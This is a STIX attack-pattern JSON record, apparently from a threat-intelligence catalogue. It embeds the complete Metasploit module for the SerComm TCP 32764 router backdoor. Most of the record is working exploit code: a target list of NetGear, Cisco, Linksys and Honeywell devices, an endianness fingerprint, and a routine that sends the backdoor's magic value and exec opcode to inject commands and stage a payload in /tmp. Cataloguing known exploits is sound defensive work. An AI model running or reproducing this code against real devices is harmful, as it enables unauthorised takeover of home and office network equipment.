{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4768d24a-c244-417f-a2e6-622341743926",
    "created": "2024-08-14T16:57:27.159079Z",
    "modified": "2024-08-14T16:57:27.159083Z",
    "name": "\"SerComm Device Remote Code Execution\"",
    "description": " This module will cause remote code execution on several SerComm devices. These devices typically include routers from NetGear and Linksys. This module was tested successfully against several NetGear, Honeywell and Cisco devices.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/sercomm_exec.rb",
            "external_id": "sercomm_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/elvanderb/TCP-32764"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"SerComm Device Remote Code Execution\",\n      'Description'    => %q{\n        This module will cause remote code execution on several SerComm devices.\n        These devices typically include routers from NetGear and Linksys.\n        This module was tested successfully against several NetGear, Honeywell\n        and Cisco devices.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>', # Initial discovery, poc\n          'Matt \"hostess\" Andreko <mandreko[at]accuvant.com>' # Msf module\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 10000, # Could be more, but this should be good enough\n          'DisableNops' => true\n        },\n      'Platform'       => 'linux',\n      'Privileged'     => false,\n      'Targets'        =>\n        [\n          ['Generic Linux MIPS Big Endian',\n            {\n              'Arch' => ARCH_MIPSBE,\n              'PackFormat' => 'VVV'\n            }\n          ],\n          ['Generic Linux MIPS Little Endian',\n            {\n              'Arch' => ARCH_MIPSLE,\n              'PackFormat' => 'NNN'\n            }\n          ],\n          ['Manual Linux MIPS Big Endian',\n            {\n              'Arch' => ARCH_MIPSBE\n            }\n          ],\n          ['Manual Linux MIPS Little Endian',\n            {\n              'Arch' => ARCH_MIPSLE\n            }\n          ],\n          ['Cisco WAP4410N',\n            {\n              'Arch' => ARCH_MIPSBE,\n              'PackFormat' => 'NNN',\n            }\n          ],\n          ['Honeywell WAP-PL2 IP Camera',\n            {\n              'Arch' => ARCH_MIPSLE,\n              'PackFormat' => 'VVV'\n            }\n          ],\n          ['Netgear DG834',\n            {\n              'Arch' => ARCH_MIPSBE,\n              'PackFormat' => 'VVV',\n              'NoArgs' => true\n            }\n          ],\n          ['Netgear DG834G',\n            {\n              'Arch' => ARCH_MIPSLE,\n              'PackFormat' => 'VVV',\n              'PayloadEncode' => 'octal'\n            }\n          ],\n          ['Netgear DG834PN',\n            {\n              'Arch' => ARCH_MIPSBE,\n              'PackFormat' => 'VVV',\n              'NoArgs' => true\n            }\n          ],\n          ['Netgear DGN1000',\n            {\n              'Arch' => ARCH_MIPSBE,\n              'PackFormat' => 'VVV',\n              'NoArgs' => true\n            }\n          ],\n          ['Netgear DSG835',\n            {\n              'Arch' => ARCH_MIPSBE,\n              'PackFormat' => 'VVV',\n              'NoArgs' => true,\n            }\n          ],\n          ['Netgear WPNT834',\n            {\n              'Arch' => ARCH_MIPSBE,\n              'PackFormat' => 'NNN',\n              'UploadPath' => '/var',\n              'PayloadEncode' => 'octal'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'References'     =>\n        [\n          [ 'OSVDB', '101653' ],\n          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ]\n        ],\n      'DisclosureDate' => '2013-12-31' ))\n\n      register_options(\n        [\n          Opt::RPORT(32764)\n        ])\n\n      register_advanced_options(\n        [\n          OptEnum.new('PACKFORMAT', [false, \"Pack Format to use\", 'VVV', ['VVV', 'NNN']]),\n          OptString.new('UPLOADPATH', [false, \"Remote path to land the payload\", \"/tmp\" ]),\n          OptBool.new('NOARGS', [false, \"Don't use the echo -en parameters\", false ]),\n          OptEnum.new('ENCODING', [false, \"Payload encoding to use\", 'hex', ['hex', 'octal']]),\n        ])\n      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    fprint = endian_fingerprint\n\n    case fprint\n    when 'BE'\n      vprint_status(\"Detected Big Endian\")\n      return Msf::Exploit::CheckCode::Appears\n    when 'LE'\n      vprint_status(\"Detected Little Endian\")\n      return Msf::Exploit::CheckCode::Appears\n    end\n\n    return Msf::Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if target.name =~ /Manual/\n      print_warning(\"Remember you can configure Manual targets with NOARGS, UPLOADPATH, ENCODING and PACK advanced options\")\n      @no_args = datastore['NOARGS']\n      @upload_path = datastore['UPLOADPATH']\n      @encoding_format = datastore['ENCODING']\n      @pack_format = datastore['PACKFORMAT']\n    else\n      @no_args = target['NoArgs']\n      @upload_path = target['UploadPath']\n      @encoding_format = target['PayloadEncode']\n      @pack_format = target['PackFormat']\n    end\n\n    execute_cmdstager(\n      :noargs => @no_args,\n      :temp => @upload_path,\n      :enc_format => @encoding_format,\n      :flavor => :echo\n    )\n  end\n\n  def endian_fingerprint\n    begin\n      connect\n\n      sock.put(rand_text(5))\n      res = sock.get_once\n\n      disconnect\n\n      if res && res.start_with?(\"MMcS\")\n        return 'BE'\n      elsif res && res.start_with?(\"ScMM\")\n        return 'LE'\n      end\n    rescue Rex::ConnectionError => e\n      print_error(\"Connection failed: #{e.class}: #{e}\")\n    end\n\n    return nil\n  end\n\n  def execute_command(cmd, opts)\n    # Get the length of the command, for the backdoor's command injection\n    cmd_length = cmd.length\n\n    # 0x53634d4d  => Backdoor code\n    # 0x07        => Exec command\n    # cmd_length  => Length of command to execute, sent after communication struct\n    data = [0x53634d4d, 0x07, cmd_length].pack(@pack_format)\n\n    connect\n    # Send command structure followed by command text\n    sock.put(data+cmd)\n    disconnect\n\n    Rex.sleep(1)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-31 ",
    "x_mitre_platforms": [
        "linux'"
    ]
}